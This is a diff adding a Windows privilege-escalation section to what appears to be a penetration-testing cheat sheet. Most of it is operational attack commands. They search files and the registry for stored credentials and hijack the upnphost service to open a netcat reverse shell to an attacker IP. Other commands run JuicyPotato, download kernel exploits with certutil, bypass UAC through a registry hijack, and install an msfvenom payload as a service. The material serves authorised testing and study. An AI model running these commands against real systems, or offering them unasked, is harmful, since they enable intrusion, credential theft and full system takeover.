@@ -346,6 +346,13 @@ w                       # Other users logged onto the system
 cat /etc/motd           # Message of the day, possibly triggered on login
 ```
 
+Sudoedit exploit (if "sudo -l" allows for sudoedit)
+```sh
+# Check for sudoedit version
+
+
+```
+
 ### 2.2 Windows Local Privilege Escalation ###
 
 Standard commands to enumerate the system (just in case, REM = comment):
@@ -364,21 +371,182 @@ whoami /groups          REM List of groups user is in (Indicates Shell Level)
 whoami /priv            REM List of privileges for current user
 
 REM System information
-hostname                                                # hostname
-systeminfo                                              # Architecture, OS build, Hotfixes etc.
-wmic qfe get Caption,Description,HotFixID,InstalledOn   # Installed hotfix information
+hostname                                                REM hostname
+systeminfo                                              REM Architecture, OS build, Hotfixes etc.
+wmic qfe get Caption,Description,HotFixID,InstalledOn   REM Installed hotfix information
 
 REM Network information
-arp -A                          # Dumps Address Resolution Protocol (ARP) cache
-ipconfig /all                   # Display all IP-related information
-netsh firewall show state       # Display current state of firewall
-netsh firewall show config      # Display current configuration of firewall
+arp -A                          REM Dumps Address Resolution Protocol (ARP) cache
+ipconfig /all                   REM Display all IP-related information
+netsh firewall show state       REM Display current state of firewall
+netsh firewall show config      REM Display current configuration of firewall
+netstat -ano                    REM Show open ports (e.g. internal-only services)
 
-REM Common location for passwords
-C:\sysprep\sysprep.inf
+REM Common location for passwords (Filesystem and Registry)
+findstr /si password *.<EXT>                                            REM Search for "password" on all .<EXT> files
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"  REM Windows autologon credentials
+reg query HKCU /f password /t REG_SZ /s                                 REM Search for "password" in HKCU
+reg query HKLM /f password /t REG_SZ /s                                 REM Search for "password" in HKLM
+type C:\sysprep\sysprep.inf                                             REM base64-encoded system credentials
+type C:\sysprep\sysprep.xml                                             REM base64-encoded system credentials
+type C:\unattended.xml                                                  REM Possible system credenials
 
+REM Scheduled tasks
+schtasks /query /fo LIST /v REM Display all scheduled tasks
 
+REM Services
+net start                                  REM Services started on Windows startup
+net stop <SERVICE> && net start <SERVICE>  REM Stop, then start <SERVICE>
+sc query state= all                        REM Output information of all services
+sc qc <SERVICE>                            REM Output <SERVICE> information e.g. Path to Binary .exe
+tasklist /SVC                              REM Display running processes and associated services
+wmic service list brief                    REM Output information of all services
+wmic service <SERVICE> call startservice   REM Restart <SERVICE>
+
+REM Permissions (cacls.exe = XP and before, icacls.exe = Vista and later)
+accesschk.exe -ucqv <SERVICE> /accepteula       REM Check for service permissions
+accesschk.exe -uwcqv "<GROUP>" * /accepteula    REM Check for write access to any service(s) as <GROUP>
+icacls "C:\path\to\file.exe"                    REM Display file permissions (want BUILTIN\USERS (F)/(M) prefably)
+
+REM Unquoted File Paths (e.g. C:\AB CD\file.exe -> C:\AB.exe runs first!)
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\"
+
+REM Display all drivers (hope for vulnerable one)
+driverquery
+
+REM AlwaysInstallElevated check (.msi files installed with elevated privileges)
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
 ```
+
+Windows-Exploit-Suggester (using systeminfo output, executed locally on Kali)
+```sh
+python windows-exploit-suggester.py --update                        # Generate XLS file
+python windows-exploit-suggester.py -i systeminfo.txt -d <XLS file> # Generate LPE suggestions
+```
+
+UpnpHost Service Exploit (typically Windows XP <= SP1 and below)
+```bat
+sc qc upnphost
+sc config upnphost binpath= "C:\path\to\nc.exe -nv <ATTACKER IP> <LISTENING PORT> -e C:\WINDOWS\System32\cmd.exe"
+sc config upnphost obj= ".\LocalSystem" password= ""
+sc qc upnphost
+net start upnphost
+```
+
+JuicyPotato Exploit (SeImpersonatePrivilege on Windows <= 10 / <= Server 2016)
+```sh
+# Download precompile EXE file for execution
+wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
+sudo python -m SimpleHTTPServer 80
+```
+```bat
+REM Download the exploit
+certutil -urlcache -split -f http://<IP>:<PORT>/JuicyPotato.exe juicypotato.exe
+REM Check for BITS (pref.) service running, others applicable are OK too
+wmic service get name,startname     
+REM Search for CLSID of a desired servie on http://ohpe.it/juicy-potato/CLSID/
+REM Send reverse shell back to ourselves using downloaded nc.exe
+juicypotato.exe -l 1337 -p "C:\windows\system32\cmd.exe" -a "/c C:\path\to\nc.exe <ATTACKER IP> <LISTNEING PORT> -e cmd.exe" -t * -c {CLSID}
+```
+
+afd.sys Kernel Exploit (MS11-046, x86, Unpatched Windows 7 / Server 2008 or earlier)
+```sh
+# Cross-Compile Exploit on Kali first
+seachsploit -x 40564 > 40564.c
+i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32
+sudo python -m SimpleHTTPServer 80
+```
+```bat
+REM Execute afd.sys exploit on target system
+certutil -urlcache -split -f http://<IP>:<PORT>/40564.exe 40564.exe
+40564.exe
+```
+
+TrackPopUpMenu Privilege Escalation (MS14-058, Windows 8.0/8.1 x64)
+```sh
+# Obtain Python file from EDB first
+searchsploit -x 37064 > 37064.py
+```
+```bat
+REM Execute Python file on target system (with local Python installation)
+certutil -urlcache -split -f http://<IP>:<PORT>/37064.py 37064.py
+C:\path\to\python.exe C:\path\to\37064.py
+```
+
+'RGNOBJ' Integer Overflow (MS16-098, Windows 8.1, x64) 
+* https://sensepost.com/blog/2017/exploiting-ms16-098-rgnobj-integer-overflow-on-windows-8.1-x64-bit-by-abusing-gdi-objects/
+```sh
+# Extract exploit C file from ExploitDB and cross-compile it
+searchsploit x 41020 > 41020.c
+x86_64-w64-mingw32-gcc 41020.c -o 41020.exe -lws2_32
+sudo python -m SimpleHTTPServer 80
+```
+```bat
+REM Execute Integer Overflow exploit on target system
+certutil -urlcache -split -f http://<IP>:<PORT>/41020.exe 41020.exe
+41020.exe
+```
+
+COMahawk Local Privilege Escalation (Windows 10 Build 1803 < 1903)
+```bat
+REM Reference to EDB 47684, assume exploit saved as "exploit.exe
+exploit.exe             REM Run Exploit
+net users tomahawk      REM Check "tomahawk" added as Administrator
+
+REM Now, login as tomahawk / ribst3ak69 (lower case for all)
+```
+
+User Account Control (UAC) Bypass (Administrator User with Medium-Priv Shell)
+* Many Methods: https://github.com/hfiref0x/UACME
+* Example: Using EventVwr since it runs commands at "highest privilege possible": [https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/](https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/)
+```bat
+REM Check for Non-Strict Settings 
+REM - EnableLUA    REG_DWORD    0x1 (0 = No Bypass, 1 = UAC Active)
+REM - ConsentPromptBehaviorAdmin=2 and PromptOnSecureDesktop=1 --> DIFFICULT
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System
+
+REM If Ok, we use EventVwr for a bypass https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
+```
+```sh
+# C file Exploit for EventVwr Bypass, cross compile first (e.g. x86)
+wget https://github.com/turbo/zero2hero/blob/master/main.c
+i686-w64-mingw32-gcc main.c -o uacbypass.exe # Run on Windows!
+sudo python -m SimpleHTTPServer 80 # Host exe file for download...
+```
+```bat
+REM EventVwr Bypass Powershell Script
+https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-EventVwrBypass.ps1
+powershell.exe
+.\Invoke-EventVwrBypass.ps1
+```
+```bat
+REM EventVwr Bypass Manual Registroy Overwrite (same effects as above)
+reg query HKCU\Software\Classes\mscfile\shell\open\command
+reg add HKCU\Software\Classes\mscfile\shell\open\command /d "C:\path\to\nc.exe <ATTACKER IP> <LISTENING PORT> -e cmd.exe" /f
+reg query HKCU\Software\Classes\mscfile\shell\open\command
+```
+
+Switching execution as another user (e.g. after UAC bypass etc.) to send a reverse netcat high-privilege shell
+```bat
+ psexec64.exe -accepteula -u <ADMIN USER> -p <ADMIN PASSWORD> C:\path\to\nc.exe <ATTACKER IP> <LISTENING PORT> -e cmd.exe
+```
+
+Optional: "Possible switch" from Local Administrator to NT AUTHORITY\SYSTEM
+```sh
+# Generate a reverse shell with appropriate payload + start listening shell
+msfvenom -p <REVERSE SHELL PAYLOAD> LHOST=<ATTACKER IP> LPORT=<PORT> -f exe -b "\x00" > getsystem.exe
+sudo python -m SimpleHTTPServer 80
+sudo nc -nlvp <PORT> # On another shell
+```
+```bat
+REM Download file, create a service for it and start it
+certutil -urlcache -split -f http://<IP>:<PORT>/getsystem.exe C:\getsystem.exe
+sc create myservice binpath= "C:\getsystem.exe" type= own type= interact
+sc start myservice
+```
+
+
 
 ### 2.3 Cross-Compilation of C/C++ Files on Kali Linux ###
 
